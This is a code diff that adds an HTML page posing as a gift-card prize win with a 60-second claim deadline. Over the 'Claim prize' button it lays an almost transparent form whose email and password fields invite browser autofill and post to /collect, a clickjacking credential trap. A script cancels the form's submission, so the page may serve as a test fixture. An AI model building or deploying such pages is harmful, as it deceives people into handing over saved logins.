@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Congratulations! You are today's winner</title>
+<style>
+  body { margin: 0; font: 16px system-ui, sans-serif; background: radial-gradient(circle at 50% 30%, #fde047, #f97316); color: #431407; }
+  .stage { position: relative; width: 600px; height: 520px; margin: 40px auto; text-align: center; }
+  h1 { font-size: 40px; margin: 30px 0 10px; }
+  .bait { position: absolute; left: 150px; top: 260px; width: 300px; height: 64px; border: 0; border-radius: 32px; background: #16a34a; color: #fff; font: 700 22px system-ui, sans-serif; box-shadow: 0 6px 0 #166534; }
+  #trap { position: absolute; left: 150px; top: 262px; width: 300px; z-index: 10; opacity: 0.01; }
+  #trap input { display: block; width: 300px; height: 30px; box-sizing: border-box; margin: 0 0 4px; font: 14px system-ui, sans-serif; }
+</style>
+</head>
+<body>
+<div class="stage">
+  <h1>🎉 You won a $500 gift card!</h1>
+  <p>Click the button below within 60 seconds to claim your prize.</p>
+  <button class="bait" id="claim" type="button">Claim prize</button>
+  <div id="trap">
+    <form id="trap-form" action="/collect" method="post">
+      <input id="cj-user" name="username" type="email" autocomplete="username" aria-label="Email">
+      <input id="cj-pass" name="password" type="password" autocomplete="current-password" aria-label="Password">
+    </form>
+  </div>
+</div>
+<script>document.getElementById('trap-form').onsubmit = function (e) { e.preventDefault(); };</script>
+</body>
+</html>
